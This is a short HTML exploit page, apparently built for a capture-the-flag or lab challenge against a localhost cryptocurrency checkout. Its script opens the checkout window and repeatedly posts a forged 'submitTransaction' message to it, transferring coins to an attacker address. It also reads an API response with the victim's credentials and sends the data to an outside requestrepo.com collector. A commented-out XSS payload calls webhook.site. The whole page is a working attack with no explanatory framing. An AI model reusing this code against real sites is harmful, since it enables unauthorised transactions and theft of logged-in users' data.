<html>
<body>
    <script>        
        //const xssPayload = '\"\u003E\u003Cimg src=x onerror=fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/XSS_SUCCESS`)\u003E';

        const win = window.open("http://localhost/checkout.html?currency=1337COIN&price=1000000", "_blank");
        const payload = {
        type: "submitTransaction",
        transaction: {
            toAddress: "xssishere",
            currency: "1337COIN",
            amount: 1111
        }
    };

    setInterval(() => {
        if (win) {
            console.log("Sending payload...");
            win.postMessage(payload, "*");
            fetch(`https://we6hfxdk.requestrepo.com?status=sent`);
        }
    }, 1000);
        
      

fetch('http://localhost/api/marketwatch',  {
  method: "GET",
  credentials: "include"
})
  .then(response => response.text()) 
  .then(data => {
    fetch('https://we6hfxdk.requestrepo.com/?dd=' + encodeURIComponent(data));
  })
  .catch(error => {
    fetch('https://we6hfxdk.requestrepo.com/?error=' + encodeURIComponent(error.message));
  });
        
    </script>
</body>
</html>
